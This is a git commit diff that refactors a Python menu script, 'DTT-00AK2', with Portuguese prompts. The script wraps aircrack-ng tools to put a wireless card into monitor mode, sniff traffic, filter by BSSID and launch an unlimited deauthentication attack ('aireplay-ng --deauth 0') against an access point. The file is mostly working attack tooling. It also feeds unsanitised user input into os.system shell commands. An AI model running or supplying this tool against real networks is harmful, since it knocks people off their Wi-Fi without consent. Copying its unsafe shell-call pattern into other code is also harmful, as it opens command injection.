14900e0ca4f0ebcd9ee38ec68483f9d21ab7858e
Anderson B Silva (Ander) <32654298+oanderoficial@users.noreply.github.com>
2024-01-01 14:09:00 -0300

    Update DTT-00AK2.py

--- DTT-00AK2.py
+++ DTT-00AK2.py
@@ -1,15 +1,35 @@
-import os 
+import os
 
 RED = '\033[91m'
-GREEN = '\033[92m'
 YELLOW = '\033[93m'
+GREEN = '\033[92m'
 RESET = '\033[0m'
 
-interface = ""
+def start_monitor_mode():
+    os.system("airmon-ng")
+    interface = input("Digite aqui qual interface utilizar: ")
+    os.system(f"airmon-ng start {interface}")
+
+def analyze_wifi_traffic():
+    interface = input(GREEN + "Digite a interface: " + RESET)
+    os.system(f'xterm -e airodump-ng "{interface}"')
+    os.system('clear')
+
+def filter_results_by_bssid():
+    channel = input(GREEN + "Digite o canal: " + RESET)
+    bssid = input(GREEN + "Digite a BSSID: " + RESET)
+    interface = input(GREEN + "Digite a interface: " + RESET)
+    os.system('clear')
+    os.system(f'xterm -e airodump-ng -c {channel} --bssid {bssid} {interface}')
+    os.system('clear')
+
+def perform_deauthentication_attack():
+    bssid = input(GREEN + "Digite a BSSID: " + RESET)
+    interface = input(GREEN + "Digite a interface: " + RESET)
+    os.system(f'xterm -e aireplay-ng --deauth 0 -a {bssid} {interface}')
 
 while True:
-    print ( RED + """
-
+    print(RED + """
              _..---..__
            ,'          `-.
           .'` .          )             DTT-00AK2
@@ -19,40 +39,24 @@ while True:
               < <"v\,,,,]
                `\`^-''''7
                  `~"--^-'
-
-
     """ + RESET)
-    print(RED + "1-[airmon-ng] colocar a interface em modo monitor" + RESET)
-    print(YELLOW +"2-[airodump-ng] analisar o tráfego de redes sem fio"+ RESET)
-    print(RED + "3-[airodump-ng] filtrar os resultados pelo BSSID" + RESET)
-    print(YELLOW +"4-[aireplay-ng] realizar ataque no ponto de acesso (AP)"+ RESET)
+    print(RED + "1- [airmon-ng] Colocar a interface em modo monitor" + RESET)
+    print(YELLOW + "2- [airodump-ng] Analisar o tráfego de redes sem fio" + RESET)
+    print(RED + "3- [airodump-ng] Filtrar os resultados pelo BSSID" + RESET)
+    print(YELLOW + "4- [aireplay-ng] Realizar ataque no ponto de acesso (AP)" + RESET)
     print(RED + "5- Sair" + RESET)
-    menu = input( RED + "Digite uma opção>>" + RESET)
+    
+    menu = input(RED + "Digite uma opção >> " + RESET)
 
     if menu == "1":
-     os.system("airmon-ng")
-     interface = input("Digite aqui qual interface utilizar:")
-     os.system(f"airmon-ng start {interface}")
-
+        start_monitor_mode()
     elif menu == "2":
-        interface = input( GREEN +"Digite a interface:" + RESET)
-        os.system(f'xterm -e airodump-ng "{interface}"')
-        os.system('clear')
-
-    elif menu == "3": 
-        channel = input( GREEN +"Digite o canal:" + RESET)
-        bssid = input( GREEN +"Digite a bssid:" + RESET)
-        interface = input( GREEN +"Digite a interface:" + RESET)
-        os.system('clear')
-        os.system(f'xterm -e airodump-ng -c {channel} --bssid {bssid} {interface}')
-        os.system('clear')
-
+        analyze_wifi_traffic()
+    elif menu == "3":
+        filter_results_by_bssid()
     elif menu == "4":
-        bssid = input( GREEN +"Digite a bssid:" + RESET)
-        interface = input( GREEN +"Digite a interface:" + RESET)
-        os.system(f'xterm -e aireplay-ng  --deauth 0 -a {bssid} {interface}')
+        perform_deauthentication_attack()
     elif menu == "5":
         break
-
     else:
-        print ("Opção inválida")
+        print("Opção inválida")
